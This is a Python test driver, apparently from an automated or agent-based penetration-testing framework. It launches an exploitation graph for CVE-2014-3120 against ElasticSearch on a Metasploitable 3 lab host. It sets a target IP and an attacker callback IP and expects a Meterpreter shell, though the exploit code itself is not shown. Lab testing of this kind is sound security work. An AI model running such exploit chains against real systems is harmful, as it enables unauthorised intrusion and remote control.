"""
Live test driver for examples/elasticsearch_rce_graph.py.

Unauthenticated JSON-API exploitation chain against Metasploitable 3's
ElasticSearch 1.1.1 on port 9200 (CVE-2014-3120 MVEL scripting).
Expected to land a Java Meterpreter session.
"""

from __future__ import annotations
import os

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core_agents.orchestrator import run_graph
from examples.elasticsearch_rce_graph import build_elasticsearch_rce_graph

TARGET_IP = "192.168.34.7"
ATTACKER_IP = os.getenv("LHOST", "192.168.34.1")

if __name__ == "__main__":
    graph = build_elasticsearch_rce_graph(target_ip=TARGET_IP, attacker_ip=ATTACKER_IP)
    print(f"Loaded graph: {graph.name}  ({len(graph.nodes)} nodes, {len(graph.edges)} edges)")
    print(f"Running with explore=True, use_judge=True against {TARGET_IP}...")
    run_graph(graph, explore=True, use_judge=True)
